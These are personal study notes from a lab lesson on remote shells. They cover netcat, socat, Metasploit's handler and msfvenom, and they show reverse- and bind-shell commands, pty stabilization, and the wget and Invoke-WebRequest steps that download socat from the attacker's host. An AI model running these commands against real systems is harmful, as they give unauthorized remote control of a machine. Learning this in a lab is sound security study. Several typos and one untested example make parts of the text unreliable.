---
tags:
  - programming/linux
  - programming/hacking/networking
---

# Not a whole lot of stuff on this on

This lesson is mostly just learning it and pressing complete

# Tools used

## Netcat

Basically a swiss army knife of networking. Does a lot of manual stuff. Most importantly for what we are doing is it can
receive reverse shells and use them. The problem is that these are kind of unstable - we'll get to that

## Socat

Super Netcat! Syntax is harder and not installed by default

## Metasploit - multi/handler

See [Metasploit](Metasploit.md)

Part of metasploit framework, but also stand alone. Use `auxiliary/multi/handler` module to receive reverse shells. Pretty stable, opens a meterprester shell and handles
staged payloads.

## Msfvenom

Part of metasploit framework as well and a standalone. Can generate payloads on the fly. Can do more than reverse and
bing shells, but that's what we are going to use it for.

# Types of shell

## Reverse shell

See [Reverse Shells](Reverse%20Shells.md)

The target computer reaches out to your computer and then you listen on the local computer for the connection. This is
good for bypassing firewalls on the target computer, but you have to make sure your firewall will allow the connection.

## Bind shell 

You connect to a part on the target computer. This case you have to worry about the target firewall. Generally, reverse
shells are easier to use

## Reverse shell example

On the attacking machine run `sudo nc -lvnp 443`. This will listen for incoming messages on part 443. 

On the target machine run `nc <LOCAL-IP> <PORT> -e /bin/bash. How to find the LOCAL-IP and PORT? The PORT is the same
value as above (443) and local IP can be found through `ip a s`

The target will reach out to the attacker and establish a connection.

## Bind shell 

Less common, but let's do it. 

Target: `nc -lvnp <PORT> -e "cmd.exe"`

Attacker: `nc <MACHINE_IP> <PORT>`

Target will run "cmd.exe" on the port. Then the attacker just connects and is done. 

## Interactive vs non-interactive 

The shells that you are used to are "interactive" shells - they allow you to interact with programs after running them.
IE - it responds to what you put in. 

Non-interactive shells do not dothat. Once you enter a command it may or may not return output. This depends on if the
program you run in interactive or non-interactive. For exmaple `python` will not run as it open Python interactively.
`python -c "import os; print os.eniron"` should work as it runs python and the exits. That's my own personal example - I
haven't actually tested it

!! TUTORIAL NOTE !! - `listener` is an alias for `sudo rlwrap nc -lvnp 443`. Don't get confused

# Netcat

Most basic tool for networking. We are going to focus on using shells. Breaking down the command `nc -lvnp <PORT>`

```bash
    nc  # Run netcat
    -l  # run in listen mode
    -v  # Verbose output
    -n  # No hostnames or DNS (look it up - not explained)
    -p  # Port to use will follow
```

Can use any port you want, but anything below 1024 will require sudo. BUT.... using a common port is more likely to past
the firewall (80, 443, 53). Good example `sudo nc -lvnp 443`

## Bind shells

Bind shells are done with `nc <IP_ADD> <PORT>`.

## Stabilizing Techniques

Netcat shells kind of suck. They are unstable `Ctrl+C` kills the whole thing, they are non-interactive and have with
formatting issues. Pretty easy to do on Linux, not so easy to do on Windows.

### 1 - Python

Only applies to Linux since they almost always have Python. 

```bash
    # Create the shell
    python -c 'import pty;pty.spawn("/bin/bash")'
    
    # get terminal commands set up
    export TERM=xterm

    # background shell (ctrl+z)
    # In our terminal
    stty raw -echo; fg
```

Last line is a little complicated - turns off our termianl echo - tab completion, arrow keys and ctrl+c. Then bring the
shell back up. I think this is so we don't accidentally kill the shell we just made

If the shell dies, need to do `reset` in local shell to get it working again

### 2 - rlwrap

Gives us history, autocomplete and arrow keys once in shell, but ctrl+c might need some work. Not installed on kali by
default `sudo apt install rlwrap`

To use rlwrap: `rlwarp nc -lvnp <PORT>`

Works like magic to stabilize the shell from netcat. Particularly useful on Windows as it can be hard to get a shell any
other way. Stabilize on Linux like above - send to background and then `stty raw -echo;fg`

### 3 - socat

Limited to Linux targets. First need to move socat static compiled binary up to the target machine. Can move the file by
creating a server on local machine and getting the file on the target

```bash
    # On attacking
    sudo python3 -m http.server 80

    # On target - Linux
    wget <LOCAL-IP>/socat -O /tmp/socat

    # Or.... Windows.... 
    Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
```
That is all the is covered here - going over socat later


### Change terminal tty size

Useful because the reverse shell is pretty stupid and doesn't configure the size automically

```bash
    stty -a     # current setting
    stty rows <NUMBER>  # Set rows 
    stty cols <NUMBER>  # Set columns 
```


# Socat


